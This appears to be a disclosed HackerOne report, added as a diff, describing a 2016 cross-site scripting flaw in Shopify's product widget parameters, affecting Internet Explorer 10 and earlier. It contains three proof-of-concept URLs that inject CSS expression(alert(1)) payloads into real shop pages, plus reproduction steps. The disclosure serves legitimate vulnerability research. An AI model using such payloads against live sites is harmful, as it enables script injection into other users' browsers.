@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/105659
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/sergeym
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:04.02.2016 10:15:13
+
+Summary:
+
+xss does work only for internet explorer browser version <=10 (or in compatible mode)
+
+xss in https://widgets.shopifyapps.com/products/...?style=[xss]&button-bg-color=[xss]
+is affected parameters style and button-bg-color (maybe to include expression in style of page)
+
+example of xss for ie(i have test ie8 , windows os) : 
+
+https://widgets.shopifyapps.com/products/the-inbreds-winning-hearts?shop=zunior.myshopify.com&style=artgallery&image-size=compact&button-bg-color=expression(alert(1))
+
+https://widgets.shopifyapps.com/products/buldre-bursdag-ekstra-personer?shop=klatrefabrikken.myshopify.com&style=artgallery&button-bg-color=expression(alert(1))
+
+https://widgets.shopifyapps.com/products/c-of-change?shop=rox-spa-md.myshopify.com&style=h%20.product-buy-button{x:expression(alert(1))}
+
+how to reproduce:
+1. to use ie with version <=10
+2. go to the page (look at up)
+3. will be alert box with 1
